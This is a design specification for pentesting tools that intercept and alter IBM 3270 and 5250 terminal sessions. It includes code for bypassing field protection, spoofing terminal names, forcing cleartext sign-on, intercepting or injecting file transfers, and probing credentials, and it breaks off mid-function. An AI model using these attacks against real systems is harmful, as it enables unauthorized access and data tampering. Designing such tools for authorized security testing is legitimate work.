# hackterm — hack3270 Modernization & hack5250 Greenfield

**Date:** 2026-04-07
**Approach:** Sibling Product (Approach C)
**Scope:** Extract shared core, add 5 novel attacks to hack3270, build hack5250 from scratch

---

## 1. Problem Statement

### What hack3270 is today (v2.8.1)

A tn3270 MITM proxy for CICS pentesting. Operator points x3270 at the proxy; proxy connects to the mainframe; proxy mutates the datastream in flight (flips field-protection bits, reveals hidden fields, injects AID keys, fuzzes input). PySide6 GUI, SQLite logging, MCP server for AI-driven testing.

### The problems

**Code health**
- 4 divergent 3270 datastream parsers: `libhack3270.py:manipulate()` (live attacks, weakest — naive byte scan, false positives on EBCDIC `]`), `hack3270_api.py:parse_screen_fields()` (best), `hack3270_mcp.py:_parse_screen()` (most complete), `gui.py:_parse_screen_fields()` (duplicate)
- 3 divergent EBCDIC tables (one has typo `[0x074]`, all incomplete, none codepage-aware)
- Zero tests
- Business logic embedded in 165KB `gui.py` (payload generation L2705-3100)
- Proxy can't run headless — `daemon()` only pumps when GUI's QTimer fires

**Attack-surface gaps (3270)**
Five attack classes a tn3270 MITM proxy is uniquely positioned for, that no tool implements:
1. **tn3270E LU-name spoofing** — preset-terminal auth bypass (RFC 2355 §3-4)
2. **Query Reply lying** — force BMS down untested code paths (zero prior research)
3. **Pseudo-conversational state fuzzing** — COMMAREA echo-back tracking, EIBCALEN overflow
4. **IND\$FILE interception** — silently capture/inject file transfers
5. **Passive ESM fingerprinting** — DFHCE3530/3532 differential, password-policy inference

**No tn5250 support**
IBM i (AS/400) shops are common pentest targets. No 5250 MITM tool exists publicly. The FFW (Field Format Word) bypass-bit attack — direct analog of 3270 SF bit-5 — has never been demonstrated. RFC 2877's IBMRSEED auto-signon has a designed-in cleartext fallback that a proxy can force.

### Decision: Approach C — Sibling Product

User chose sibling product over strangler-fig refactor. Rationale: lowest risk to working tool, fastest 5250 delivery, accept the cost of two GUIs/two MCP servers. **The 4-parser/3-EBCDIC mess in hack3270's legacy attacks is explicitly NOT fixed** — only new attacks get a clean parser.

---

## 2. Architecture

### 2.1 Three-package structure

```
hackterm-core/          ← new package, ~1800 LOC, pip-installable
hack3270/               ← existing tool, shrinks ~40%, gains 5 attacks
hack5250/               ← new tool, ~3500 LOC, greenfield
```

Both tools `pip install hackterm-core` (or `-e` during dev). Layout:

```
hack3270-update/
  hackterm-core/
    pyproject.toml
    hackterm_core/
      __init__.py
      protocol.py         # Protocol ABC + Screen/Field/MutateOpts/NegotiateOpts dataclasses
      proxy.py            # ProxyDaemon — select() loop, socket pair, TLS, headless-capable
      ebcdic.py           # codecs-based cp037/cp500/cp1140 + fallback table
      storage.py          # SQLite Logs/Config, BLOB packets, replay
      inject.py           # mask-template (preamble/****/postamble) machinery
      api_server.py       # :31337 TCP listener scaffolding, handler registration
    tests/
      test_ebcdic.py
      test_proxy.py
      test_storage.py
      test_inject.py

  hack3270/               # existing repo content, restructured
    hack3270.py           # entry point — unchanged
    hack3270_libs/
      libhack3270.py      # SHRINKS: daemon/storage/inject/ebcdic move to core
      gui.py              # SHRINKS: payload logic moves to attacks/
      hack3270_api.py     # mostly unchanged
      tn3270_legacy.py    # NEW: wraps manipulate() as Protocol subclass — keeps old attacks working
      tn3270_v2.py        # NEW: clean state-machine parser — only new attacks use this
      attacks/            # NEW
        __init__.py
        negotiation.py    # LU-name spoofing
        structured.py     # Query Reply lying + IND$FILE intercept
        state_fuzz.py     # pseudo-conversational fuzzer
        esm_passive.py    # CESN fingerprinting
    injections/
      lu-names.txt        # NEW wordlist
      ... (existing wordlists unchanged)
    MCPs/hack3270_mcp/
      hack3270_mcp.py     # gains ~15 new tools for the 5 attacks
    tests/
      golden/             # captured DVCA datastreams as .bin
      test_tn3270_v2.py
      test_attacks_*.py

  hack5250/               # new
    hack5250.py
    hack5250_libs/
      libhack5250.py
      tn5250.py           # implements Protocol — ONE parser, hand-rolled
      gui.py
      hack5250_api.py
      attacks/
        ffw.py            # FFW bit manipulation (the mutate() impl)
        negotiation.py    # IBMRSEED downgrade + DEVNAME spoof
        escape.py         # ATTN→F9 automation, SOH PF-mask bypass
        menuwalk.py       # menu-tree fuzzer
    injections/
      cl-commands.txt
      ibmi-default-users.txt
      ibmi-default-passwords.txt
      device-names.txt
      menu-options.txt
    MCPs/hack5250_mcp/
      hack5250_mcp.py
    tests/
      golden/             # captured PUB400 datastreams
      test_tn5250.py
```

### 2.2 The `Protocol` contract

```python
# hackterm_core/protocol.py

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Optional

@dataclass
class Field:
    row: int
    col: int
    length: int
    protected: bool
    hidden: bool
    numeric: bool
    mdt: bool
    content: bytes              # raw EBCDIC

@dataclass
class Screen:
    rows: int
    cols: int
    fields: list[Field]
    raw: bytes                  # original datastream for replay
    rendered: list[list[str]]   # rows×cols ASCII grid for display/diffing

@dataclass
class FieldWrite:
    row: int
    col: int
    data: bytes                 # EBCDIC

@dataclass
class MutateOpts:
    unprotect: bool = False         # 3270: SF bit5      | 5250: FFW bypass
    reveal_hidden: bool = False     # 3270: attr 0x0C    | 5250: screen-attr 0x27→0x20
    remove_numeric: bool = False    # 3270: SF bit4      | 5250: FFW shift bits
    high_visibility: bool = False   # 3270: inject SFE   | 5250: attr → 0x22 white
    color_reveal: bool = False      # 3270: 0x42 0xF8    | 5250: n/a (returns unchanged)

@dataclass
class NegotiateOpts:
    spoof_device_name: Optional[str] = None   # 3270: LU name | 5250: DEVNAME
    force_cleartext: bool = False             # 5250 only: strip IBMRSEED
    downgrade_functions: bool = False         # 3270 only: strip BIND-IMAGE/RESPONSES

@dataclass
class StructuredField:
    sf_type: int
    payload: bytes

@dataclass
class QueryLies:
    alt_rows: Optional[int] = None
    alt_cols: Optional[int] = None
    deny_color: bool = False
    deny_highlighting: bool = False
    deny_graphics: bool = False
    rpq_name: Optional[str] = None


class Protocol(ABC):
    name: str
    aid_table: dict[str, int]
    default_codepage: str

    @abstractmethod
    def detect(self, first_bytes: bytes) -> bool: ...

    @abstractmethod
    def negotiate_hook(self, data: bytes, direction: str, opts: NegotiateOpts) -> bytes:
        """direction: 'c2s' or 's2c'"""

    @abstractmethod
    def parse(self, data: bytes) -> Screen: ...

    @abstractmethod
    def mutate(self, data: bytes, opts: MutateOpts) -> bytes: ...

    @abstractmethod
    def build_inbound(self, aid: int, cursor: tuple[int,int],
                      fields: list[FieldWrite]) -> bytes: ...

    @abstractmethod
    def spoof_aid(self, original: bytes, new_aid: int) -> bytes: ...

    # Optional — default no-op
    def parse_structured(self, data: bytes) -> Optional[StructuredField]:
        return None

    def build_query_reply(self, lies: QueryLies) -> bytes:
        raise NotImplementedError(f"{self.name} does not support Query Reply")
```

### 2.3 `ProxyDaemon` — the headless pump

```python
# hackterm_core/proxy.py

class ProxyDaemon:
    """
    Owns client+server sockets, runs select() loop.
    No GUI dependency. Drive via .tick() from any scheduler
    (QTimer, asyncio, threading.Timer, while-True).
    """

    def __init__(self, protocol: Protocol, storage: Storage,
                 listen_addr: tuple[str,int], target_addr: tuple[str,int],
                 use_tls: bool = False):
        self.protocol = protocol
        self.storage = storage
        self.mutate_opts = MutateOpts()
        self.negotiate_opts = NegotiateOpts()
        self._handshake_complete = False
        self._observers: list[Callable[[bytes, str], None]] = []  # for ESM passive etc.
        ...

    def wait_for_client(self) -> None:
        """Blocking accept(). Replaces client_connect()."""

    def connect_to_server(self) -> None:
        """Replaces server_connect(). TLS if use_tls."""

    def tick(self) -> None:
        """One select() pass, zero timeout. Call repeatedly.
        Replaces daemon() L1329-1471."""
        rlist, _, _ = select.select(self._readables(), [], [], 0)
        for sock in rlist:
            if sock is self.client:
                data = sock.recv(BUFSIZE)
                if not self._handshake_complete:
                    data = self.protocol.negotiate_hook(data, 'c2s', self.negotiate_opts)
                self.storage.log(data, 'c2s')
                self.server.send(data)
            elif sock is self.server:
                data = sock.recv(BUFSIZE)
                if not self._handshake_complete:
                    data = self.protocol.negotiate_hook(data, 's2c', self.negotiate_opts)
                    if self.protocol.detect(data):
                        self._handshake_complete = True
                else:
                    self.storage.log(data, 's2c')  # log BEFORE mutation
                    data = self.protocol.mutate(data, self.mutate_opts)
                    for obs in self._observers:
                        obs(data, 's2c')
                self.client.send(data)

    def add_observer(self, fn: Callable[[bytes, str], None]) -> None:
        """ESM fingerprinter, IND$FILE detector etc. register here."""

    def inject_to_server(self, data: bytes) -> None:
        """Direct send. Used by AID injection, field fuzzing."""
```

### 2.4 EBCDIC — one converter, codepage-aware

```python
# hackterm_core/ebcdic.py

import codecs

class EbcdicCodec:
    """Wraps codecs for standard codepages, falls back to lookup table
    for the bytes Python's codec rejects (control chars etc.)."""

    # Bytes that codecs.decode raises on — render as printable
    _FALLBACK = {0x00: ' ', 0x05: '\t', 0x15: '\n', ...}

    def __init__(self, codepage: str = 'cp037'):
        self._codec = codecs.lookup(codepage)
        self.codepage = codepage

    def to_ascii(self, data: bytes) -> str:
        out = []
        for b in data:
            try:
                out.append(self._codec.decode(bytes([b]))[0])
            except UnicodeDecodeError:
                out.append(self._FALLBACK.get(b, f'[{b:02x}]'))
        return ''.join(out)

    def to_ebcdic(self, text: str) -> bytes:
        return self._codec.encode(text)[0]
```

**Compatibility note:** The current `e2a` table in `libhack3270.py:44` has at least one bug (`[0x074]` literal string at index 0x74) and uses non-ASCII chars (`≠`, `¢`). Phase 1 step 1.2 must diff all 256 entries against `codecs.decode(b, 'cp037')` and document every divergence in `MIGRATION.md`. Old behavior is preserved via a `legacy_compat=True` flag if any divergence turns out to matter for a real engagement.

---

## 3. hack3270 New Attacks

All five live in `hack3270_libs/attacks/`. Each: one module, one class, exposed via GUI tab + MCP tool. All depend on `tn3270_v2.py`, NOT `manipulate()`.

### 3.1 `tn3270_v2.py` — the clean parser (~600 LOC)

State-machine parser. Replaces nothing — coexists with legacy. Used only by new attacks.

**What it does that `manipulate()` doesn't:**
- Tracks write-command + WCC byte (knows where the datastream actually starts)
- IAC `0xFF 0xFF` un-escaping
- SBA position tracking (maintains current buffer address as it walks)
- TN3270E header parsing (5-byte: data-type, request-flag, response-flag, seq-num) instead of detect-and-skip
- Won't false-positive on EBCDIC `]` (`0x1D`) in text — only treats it as SF when in order-context

**Implements `Protocol`:**
- `parse()` → full `Screen` model with field positions
- `mutate()` → same SF/SFE/MF flips as `manipulate()` but context-aware
- `build_inbound()` → uses the proper 12/14-bit address codec
- `parse_structured()` → recognizes Write Structured Field (write command `0xF3` per GA23-0059, or `0x11` followed by SF length+ID in some encodings — handle both), dispatches to `StructuredField` objects
- `build_query_reply()` → see §3.4

Golden-file tested against DVCA captures.

### 3.2 `attacks/negotiation.py` — LU-Name Spoofing (~250 LOC)

**Class:** `LUSpoofer`

**State:**
- `mode: Literal['single', 'wordlist', 'harvest']`
- `target_lu: Optional[str]`
- `wordlist: list[str]` (loaded from `injections/lu-names.txt`)
- `wordlist_idx: int`
- `harvested: set[str]`
- `login_screen_fingerprint: Optional[bytes]` (hash of first post-handshake screen)
- `results: list[tuple[str, str]]` — `[("TCP00042", "CESN"), ("CICSA01", "MAIN MENU")]`

**Hooks into `ProxyDaemon` via `negotiate_opts.spoof_device_name`:**

```python
# In TN3270.negotiate_hook(), c2s direction:
# Looking for: IAC SB TN3270E DEVICE-TYPE REQUEST <type> [CONNECT <luname>] IAC SE
#              ff  fa  28      02          07     ...    01      ...        ff f0
PATTERN = bytes([0xff, 0xfa, 0x28, 0x02, 0x07])
if PATTERN in data and opts.spoof_device_name:
    # find CONNECT (0x01) marker, splice in new luname (ASCII, not EBCDIC — it's telnet layer)
    ...
```

**Wordlist mode reconnect cycle:**
1. `daemon.disconnect_client()` → emulator drops
2. `negotiate_opts.spoof_device_name = wordlist[idx++]`
3. `daemon.wait_for_client()` → emulator auto-reconnects (x3270 does this)
4. After handshake, `parse()` first screen, compare against `login_screen_fingerprint`
5. Match → log fail, goto 1. Mismatch → **stop, alert operator**

**Wordlist (`injections/lu-names.txt`):**
```
TCP00001
TCP00002
... (TCP00001-00099)
LU01
... (LU01-LU99)
CICSA01
CICSA02
... (common region patterns)
TERM0001
... etc — ~500 entries seeded, harvest mode grows it
```

**MCP tools:**
- `lu_spoof_single(name: str) -> dict` — try one, return resulting screen
- `lu_spoof_enumerate(wordlist: str, max: int) -> list[dict]` — iterate
- `lu_get_harvested() -> list[str]` — what we've passively seen

**GUI:** "Negotiation" tab. Mode radio group, LU-name entry / wordlist dropdown, "Try Next" button, results table (LU | Result | Screen Preview).

### 3.3 `attacks/esm_passive.py` — ESM Fingerprinting (~150 LOC)

**Class:** `ESMFingerprinter`

Registers as a `ProxyDaemon` observer. Pure pattern-matching on `parse()` output text.

**Inference rules:**

| Pattern (in screen text) | `findings` key | Inference |
|---|---|---|
| `DFHCE3530` | `username_enum` | Pre-CICS-TS-5.1 or unpatched. Username oracle exists. |
| `DFHCE3532` | `username_enum` | Confirms differential — userid valid, password wrong. |
| `DFHCE3520` | `account_state_leak` | Distinguishes revoked from bad-credential. |
| `DFHCE3592` | `password_expiry` | RACF `INTERVAL` non-zero. |
| `DFHCE3543` | `passphrase` | Passphrase support enabled. |
| Password field `length == 8` (from `Screen.fields`) | `no_passphrase` | RACF without KDFAES. |
| Password field `length > 8` | `passphrase_capable` | MIXEDCASE likely too. |
| `ICH408I` | `racf_confirmed` | It's RACF (not ACF2/TopSecret). |
| `ACF01` prefix | `acf2_confirmed` | It's ACF2. |
| `TSS` prefix | `topsecret_confirmed` | It's TopSecret. |

**Active probe (off by default, `active_probe(user, password)`):**

Given one valid credential, replays login N times with single-character mutations:
- Case-flip char 0 → success = `MIXEDCASE` not enforced; fail = case-sensitive
- Append 9th char → field rejects = 8-char max; accepts but auth fails = host truncates
- `$` → `!` → success = liberal special chars; fail = restricted set

Uses `daemon.inject_to_server()` to drive CESN directly. Rate-limited (1/sec) to avoid revoke-on-N-failures.

**MCP:** `esm_get_findings() -> dict`, `esm_active_probe(user, password) -> dict`

**GUI:** Dock widget (always visible, right side). Findings list, color-coded by severity. Updates live.

### 3.4 `attacks/structured.py` — Query Reply Lying + IND\$FILE (~500 LOC)

Two attacks, one module, shared structured-field parser.

#### Query Reply Lying

**Class:** `QueryReplyLiar`

When armed, watches for host→client `WSF Read Partition (Query)`:
```
[TN3270E hdr] F3 <len-hi> <len-lo> 01 FF 02
              ^WSF        ^SF len   ^Read Partition ^Query
```

Eats it (does NOT forward to client). Synthesizes reply with operator-chosen lies:

```python
def build_query_reply(self, lies: QueryLies) -> bytes:
    # AID 0x88 (structured field) + sequence of self-defining SFs
    parts = [b'\x88']
    # Usable Area — always include, this is where dimensions go
    parts.append(self._sf_usable_area(lies.alt_rows or 24, lies.alt_cols or 80))
    # Implicit Partition — alt-screen size
    if lies.alt_rows or lies.alt_cols:
        parts.append(self._sf_implicit_partition(lies.alt_rows, lies.alt_cols))
    # Color — omit if deny_color
    if not lies.deny_color:
        parts.append(self._sf_color())
    # Highlighting — omit if deny_highlighting
    if not lies.deny_highlighting:
        parts.append(self._sf_highlighting())
    # RPQ Names — include if rpq_name set
    if lies.rpq_name:
        parts.append(self._sf_rpq(lies.rpq_name))
    # Null SF terminates
    parts.append(b'\x00\x04\x81\xff')  # len=4, QCODE=0x81, NULL
    return b''.join(parts) + b'\xff\xef'  # IAC EOR
```

SF builders reference GA23-0059 §5 (Query Reply structured fields). Each is `<len:2> <0x81> <qcode:1> <data...>`.

**Test approach:** Synthetic — feed crafted Read Partition Query, assert reply structure. Then live against DVCA with `alt_rows=62, alt_cols=160` and observe whether BMS chokes.

#### IND\$FILE Intercept

**Class:** `IndFileInterceptor`

Watches both directions for AID `0x88` with SF type `0xD0` (File Transfer). Reassembles 32K blocks.

**State machine:**
```
IDLE → (see "IND$FILE PUT/GET" in TSO READY screen text) → ARMED
ARMED → (see AID 0x88 + SF 0xD0) → TRANSFERRING
TRANSFERRING → (accumulate blocks) → (see EOF marker / IAC EOR with no continuation) → IDLE
```

**Modes:**
- `carbon_copy`: write reassembled file to `./captured_files/<timestamp>_<direction>_<dsname>.bin`
- `inject` (upload only): when ARMED for PUT, replace user's blocks with `inject_payload` blocks
- `alert`: just append to findings list, no capture

**MCP:** `qr_arm(lies: dict)`, `qr_disarm()`, `indfile_set_mode(mode)`, `indfile_get_captures() -> list[dict]`, `indfile_set_inject_payload(content: bytes)`

**GUI:** "Structured Fields" tab, split pane. Left: QR lies checkboxes + Arm toggle. Right: IND\$FILE mode radio + capture log table.

### 3.5 `attacks/state_fuzz.py` — Pseudo-Conversational Fuzzer (~700 LOC)

**Class:** `StateFuzzer`

The most complex attack. Three-phase: record, analyze, mutate-replay.

**Data model:**
```python
@dataclass
class Step:
    host_screen: Screen      # what the host sent
    user_input: bytes        # what the user sent back (raw inbound packet)
    timestamp: float

@dataclass
class Flow:
    id: int                  # SQLite rowid
    name: str
    steps: list[Step]

@dataclass
class EchoTarget:
    step_idx: int
    field_idx: int           # index into steps[step_idx].host_screen.fields
    source_step: int         # which earlier step's input this echoes
    confidence: float        # 0-1, based on byte-match length
```

**Phase 1 — Record:**
- `start_recording(name)` → registers as observer on `ProxyDaemon`
- Each s2c packet → `parse()` → store as `Step.host_screen`
- Each c2s packet → store as `Step.user_input` on the *previous* step
- `stop_recording()` → persist `Flow` to SQLite (new `Flows` + `Steps` tables)

**Phase 2 — Analyze (`analyze(flow_id) -> list[EchoTarget]`):**
For each step N > 0:
- For each field F in `steps[N].host_screen.fields` where `len(F.content) >= 4`:
- For each step M < N:
- If `F.content` appears as a substring in `steps[M].user_input`:
- → `EchoTarget(N, F_idx, M, confidence=len(match)/len(F.content))`

This is O(steps² × fields) but flows are short (5-15 steps typical).

**Phase 3 — Mutate & Replay (`fuzz_target(flow_id, target, mutation)`):**

Mutations:
| Name | Mechanic |
|---|---|
| `length_plus_1` | Original field content + 1 byte. Tests if EIBCALEN check exists. |
| `length_double` | Original × 2. |
| `type_confusion` | If field looked numeric (all `0xF0-0xF9`), replace with alpha. |
| `extra_sba` | Append an SBA + addr + data triple the original screen didn't have. |
| `step_swap` | Replay step M's input at step N (state desync). |

Replay driver:
1. `daemon.disconnect_client()`, reconnect, fresh session
2. For each step in flow up to `target.step_idx - 1`: send `step.user_input` verbatim, wait for response, assert it `~=` recorded `host_screen` (fuzzy — timestamps differ)
3. At target step: send mutated input
4. Capture response. Compare against recorded `steps[target.step_idx + 1].host_screen`.
5. Divergence categories: `ABEND` (regex match), `DISCONNECT`, `SCREEN_DIFFERS`, `IDENTICAL` (no effect)

**MCP:** `flow_record_start(name)`, `flow_record_stop() -> flow_id`, `flow_analyze(flow_id) -> list[target]`, `flow_fuzz(flow_id, target_idx, mutation) -> result`

**GUI:** "State Fuzzer" tab. Top: Record/Stop buttons + flow name entry. Middle: tree view (Flow → Steps → Fields, echo-targets highlighted). Bottom: mutation dropdown + "Fuzz" button + results table.

---

## 4. hack5250

### 4.1 `tn5250.py` — Protocol Implementation (~800 LOC)

References: Wireshark `packet-tn5250.c`, `lib5250/codes5250.h`, RFC 1205, RFC 2877, IBM SC30-3533.

#### Constants

```python
# === 10-byte SNA-style header (RFC 1205) ===
# bytes 0-1: record length
# byte 2:    record type (0x12A0 = GDS)
# bytes 3-4: reserved
# byte 5:    variable header len (always 0x04)
# bytes 6-7: flags (ERR, ATN, etc.)
# byte 8:    opcode
HDR_LEN = 10

OPCODE_NONE          = 0x00
OPCODE_INVITE        = 0x01
OPCODE_OUTPUT        = 0x02
OPCODE_PUT_GET       = 0x03
OPCODE_SAVE_SCREEN   = 0x04
OPCODE_RESTORE_SCREEN= 0x05
OPCODE_READ_IMMED    = 0x06
OPCODE_READ_SCREEN   = 0x07

# === Commands (after ESC 0x04 in datastream) ===
ESC = 0x04
CMD_WRITE_TO_DISPLAY  = 0x11
CMD_CLEAR_UNIT        = 0x40
CMD_CLEAR_UNIT_ALT    = 0x20
CMD_CLEAR_FORMAT_TBL  = 0x50
CMD_READ_INPUT_FIELDS = 0x42
CMD_READ_MDT_FIELDS   = 0x52
CMD_READ_MDT_ALT      = 0x82
CMD_READ_SCREEN_IMMED = 0x62
CMD_SAVE_SCREEN       = 0x02
CMD_RESTORE_SCREEN    = 0x12
CMD_WRITE_ERROR_CODE  = 0x21
CMD_WRITE_STRUCTURED  = 0xF3

# === Orders (inside Write to Display) ===
ORD_SOH = 0x01    # Start of Header — 7 bytes follow:
                  #   flags(1) + reserved(1) + err_row(1) + err_col(1) + pf_mask(3)
                  #   pf_mask: 24-bit bitmap of which F-keys are "valid"
ORD_RA  = 0x02    # Repeat to Address: row(1) + col(1) + char(1)
ORD_EA  = 0x03    # Erase to Address: row(1) + col(1) + attr(1)
ORD_TD  = 0x10    # Transparent Data: len(2) + data — DO NOT PARSE
ORD_SBA = 0x11    # Set Buffer Address: row(1) + col(1)
ORD_WEA = 0x12    # Write Extended Attribute
ORD_IC  = 0x13    # Insert Cursor: row(1) + col(1)
ORD_MC  = 0x14    # Move Cursor
ORD_WDSF= 0x15    # Write to Display Structured Field
ORD_SF  = 0x1D    # Start of Field — see FFW below

# === Start of Field structure ===
# ORD_SF (0x1D) is followed by:
#   - FFW: 2 bytes IF top bits = 01 (0x4000 mask) — otherwise it's an output-only field
#   - FCW: 2 bytes IF top bits = 10 (0x8000 mask) — optional, may repeat
#   - screen_attr: 1 byte (0x20-0x3F range)
#   - field_length: 2 bytes (big-endian)

# === FFW (Field Format Word) — 16 bits ===
FFW_ID         = 0x4000   # marker — top bits 01
FFW_ID_MASK    = 0xC000
FFW_BYPASS     = 0x2000   # ← UNPROTECT TARGET
FFW_DUP        = 0x1000
FFW_MDT        = 0x0800
FFW_SHIFT_MASK = 0x0700   # ← REMOVE_NUMERIC TARGET
                          #   000=alpha 001=alpha-only 010=numeric-shift
                          #   011=numeric-only 100=katakana 101=digits-only
                          #   110=I/O 111=signed-numeric
FFW_AUTO_ENTER = 0x0080
FFW_FER        = 0x0040   # field exit required
FFW_MONOCASE   = 0x0020
FFW_RESERVED   = 0x0010
FFW_MAND_ENTRY = 0x0008
FFW_ADJUST_MASK= 0x0007   # 000=none 101=right-zero 110=right-blank 111=mand-fill

# === FCW (Field Control Word) — 16 bits, optional ===
FCW_ID         = 0x8000
FCW_ID_MASK    = 0xC000
# FCW types: resequencing, magstripe, selector pen, ideographic, etc. — skip for now

# === Screen attribute byte (0x20-0x3F) ===
ATTR_GREEN     = 0x20
ATTR_GREEN_RI  = 0x21    # reverse image
ATTR_WHITE     = 0x22
ATTR_WHITE_RI  = 0x23
ATTR_GREEN_UL  = 0x24    # underline
ATTR_NONDISP   = 0x27    # ← REVEAL_HIDDEN TARGET
ATTR_RED       = 0x28
ATTR_RED_BLINK = 0x2A
ATTR_YELLOW    = 0x32
ATTR_BLUE      = 0x3A
ATTR_PINK      = 0x38
# bit 0x07 = column separator + nondisplay combo

# === AID values (terminal → host) ===
AID_TABLE = {
    "ENTER":  0xF1, "HELP":   0xF3, "ROLLDN": 0xF4, "ROLLUP": 0xF5,
    "PRINT":  0xF6, "RECBS":  0xF8, "CLEAR":  0xBD, "AUTO":   0x3F,
    "PA1": 0x6C, "PA2": 0x6E, "PA3": 0x6B,
    "F1": 0x31, "F2": 0x32, "F3": 0x33, "F4": 0x34, "F5": 0x35, "F6": 0x36,
    "F7": 0x37, "F8": 0x38, "F9": 0x39, "F10": 0x3A, "F11": 0x3B, "F12": 0x3C,
    "F13": 0xB1, "F14": 0xB2, "F15": 0xB3, "F16": 0xB4, "F17": 0xB5, "F18": 0xB6,
    "F19": 0xB7, "F20": 0xB8, "F21": 0xB9, "F22": 0xBA, "F23": 0xBB, "F24": 0xBC,
}

# === Inbound packet structure (terminal → host) ===
# [10-byte header] [cursor_row:1] [cursor_col:1] [AID:1] [field-data...]
# field-data is sequences of: SBA(0x11) row(1) col(1) data...
```

#### `parse()` — outbound (host → terminal)

```python
def parse(self, data: bytes) -> Screen:
    # 1. Strip & validate 10-byte header
    if len(data) < HDR_LEN: return Screen.empty()
    rec_len = (data[0] << 8) | data[1]
    opcode = data[8]
    pos = HDR_LEN

    screen = Screen(rows=24, cols=80, fields=[], raw=data, rendered=[[' ']*80 for _ in range(24)])
    cursor_row, cursor_col = 1, 1

    # 2. Walk ESC + CMD pairs
    while pos < len(data) - 2:  # leave room for IAC EOR
        if data[pos] == 0xff and data[pos+1] == 0xef: break  # IAC EOR
        if data[pos] != ESC: pos += 1; continue
        cmd = data[pos+1]
        pos += 2

        if cmd == CMD_CLEAR_UNIT:
            screen.rendered = [[' ']*80 for _ in range(24)]
            screen.fields = []

        elif cmd == CMD_WRITE_TO_DISPLAY:
            # 2 control chars follow (CC1, CC2 — keyboard lock, alarm, etc.)
            pos += 2
            pos = self._parse_wtd_orders(data, pos, screen)

        elif cmd == CMD_WRITE_STRUCTURED:
            pos = self._skip_structured(data, pos)

        # ... other commands

    return screen

def _parse_wtd_orders(self, data, pos, screen):
    cur_row, cur_col = 1, 1
    while pos < len(data):
        b = data[pos]
        if b == 0xff or b == ESC: break  # end of WTD

        elif b == ORD_SOH:
            # 0x01 + len(1) + flags(1) + resv(1) + resv(1) + err_row(1) + pf_mask(3)
            soh_len = data[pos+1]
            screen.pf_mask = int.from_bytes(data[pos+2+soh_len-3:pos+2+soh_len], 'big')
            pos += 2 + soh_len

        elif b == ORD_SBA:
            cur_row, cur_col = data[pos+1], data[pos+2]
            pos += 3

        elif b == ORD_SF:
            pos += 1
            field, pos = self._parse_sf(data, pos, cur_row, cur_col)
            screen.fields.append(field)
            cur_col += 1  # attr byte takes a position

        elif b == ORD_IC:
            screen.cursor = (data[pos+1], data[pos+2])
            pos += 3

        elif b == ORD_RA:
            to_row, to_col, fill = data[pos+1], data[pos+2], data[pos+3]
            self._fill(screen, cur_row, cur_col, to_row, to_col, fill)
            cur_row, cur_col = to_row, to_col
            pos += 4

        elif b == ORD_TD:
            td_len = (data[pos+1] << 8) | data[pos+2]
            pos += 3 + td_len  # SKIP — transparent

        elif 0x20 <= b <= 0x3F:
            # screen attribute byte standalone — applies to following text
            pos += 1

        else:
            # text byte — render
            screen.rendered[cur_row-1][cur_col-1] = self.codec.to_ascii(bytes([b]))
            cur_col += 1
            if cur_col > 80: cur_col = 1; cur_row += 1
            pos += 1

    return pos

def _parse_sf(self, data, pos, row, col):
    ffw = None
    fcws = []
    # FFW present iff top bits = 01
    word = (data[pos] << 8) | data[pos+1]
    if (word & FFW_ID_MASK) == FFW_ID:
        ffw = word
        pos += 2
        # FCWs follow — top bits = 10, can repeat
        while (((data[pos] << 8) | data[pos+1]) & FCW_ID_MASK) == FCW_ID:
            fcws.append((data[pos] << 8) | data[pos+1])
            pos += 2
    # screen attribute (1 byte)
    attr = data[pos]; pos += 1
    # field length (2 bytes)
    flen = (data[pos] << 8) | data[pos+1]; pos += 2

    return Field(
        row=row, col=col, length=flen,
        protected = bool(ffw and (ffw & FFW_BYPASS)),
        hidden    = (attr == ATTR_NONDISP) or (attr & 0x07) == 0x07,
        numeric   = bool(ffw and (ffw & FFW_SHIFT_MASK) in (0x0300, 0x0500, 0x0700)),
        mdt       = bool(ffw and (ffw & FFW_MDT)),
        content   = b'',  # filled by following text bytes
    ), pos
```

#### `mutate()` — the FFW flipper

```python
def mutate(self, data: bytes, opts: MutateOpts) -> bytes:
    out = bytearray(data)
    pos = HDR_LEN

    while pos < len(out) - 2:
        if out[pos] == 0xff and out[pos+1] == 0xef: break
        if out[pos] != ESC: pos += 1; continue
        cmd = out[pos+1]; pos += 2

        if cmd != CMD_WRITE_TO_DISPLAY:
            pos = self._skip_command(out, pos, cmd)
            continue

        pos += 2  # CC1, CC2

        # walk orders
        while pos < len(out):
            b = out[pos]
            if b == 0xff or b == ESC: break

            if b == ORD_SOH:
                soh_len = out[pos+1]
                if opts.unprotect:  # actually: enable all PF keys
                    # rewrite pf_mask to all-1s — SOH PF-MASK BYPASS
                    mask_off = pos + 2 + soh_len - 3
                    out[mask_off:mask_off+3] = b'\xff\xff\xff'
                pos += 2 + soh_len

            elif b == ORD_SF:
                pos += 1
                word = (out[pos] << 8) | out[pos+1]
                if (word & FFW_ID_MASK) == FFW_ID:
                    # === FFW MANIPULATION ===
                    if opts.unprotect:
                        word &= ~FFW_BYPASS
                    if opts.remove_numeric:
                        word &= ~FFW_SHIFT_MASK
                        word &= ~FFW_MAND_ENTRY
                        word &= ~FFW_FER  # field-exit-required is annoying when fuzzing
                    out[pos]   = (word >> 8) & 0xff
                    out[pos+1] = word & 0xff
                    pos += 2
                    # skip FCWs
                    while (((out[pos] << 8) | out[pos+1]) & FCW_ID_MASK) == FCW_ID:
                        pos += 2
                # screen attribute
                attr = out[pos]
                if opts.reveal_hidden and (attr == ATTR_NONDISP or (attr & 0x07) == 0x07):
                    out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
                pos += 1
                pos += 2  # field length

            elif b == ORD_SBA: pos += 3
            elif b == ORD_IC:  pos += 3
            elif b == ORD_RA:  pos += 4
            elif b == ORD_TD:
                td_len = (out[pos+1] << 8) | out[pos+2]
                pos += 3 + td_len
            elif 0x20 <= b <= 0x3F:
                # standalone screen attr
                if opts.reveal_hidden and (b == ATTR_NONDISP or (b & 0x07) == 0x07):
                    out[pos] = ATTR_WHITE if opts.high_visibility else ATTR_GREEN
                pos += 1
            else:
                pos += 1  # text byte

    return bytes(out)
```

#### `build_inbound()`

```python
def build_inbound(self, aid: int, cursor: tuple[int,int],
                  fields: list[FieldWrite]) -> bytes:
    body = bytearray()
    body.append(cursor[0])  # row
    body.append(cursor[1])  # col
    body.append(aid)
    for fw in fields:
        body.append(ORD_SBA)
        body.append(fw.row)
        body.append(fw.col)
        body.extend(fw.data)

    # 10-byte header
    rec_len = HDR_LEN + len(body) + 2  # +2 for IAC EOR
